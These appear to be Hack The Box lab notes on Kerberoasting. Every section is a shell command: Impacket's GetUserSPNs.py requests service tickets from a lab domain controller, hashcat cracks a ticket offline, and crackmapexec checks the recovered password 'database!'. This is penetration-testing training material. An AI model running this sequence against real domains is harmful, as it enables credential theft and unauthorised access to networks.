## Kerberoasting with GetUserSPNs.py
#### Installing Impacket using Pip

```shell
3kjS@htb[/htb]$ sudo python3 -m pip install .
```
#### Listing GetUserSPNs.py Help Options

```shell
3kjS@htb[/htb]$ GetUserSPNs.py -h
```
![](Screenshot%202026-05-27%20at%2018.00.46.png)
#### Listing SPN Accounts with GetUserSPNs.py

```shell
3kjS@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```
#### Requesting all TGS Tickets

```shell
3kjS@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```
#### Requesting a Single TGS ticket

```shell
3kjS@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```
#### Saving the TGS Ticket to an Output File

```shell
3kjS@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```
#### Cracking the Ticket Offline with Hashcat

```shell
3kjS@htb[/htb]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```
#### Testing Authentication against a Domain Controller

```shell
3kjS@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```
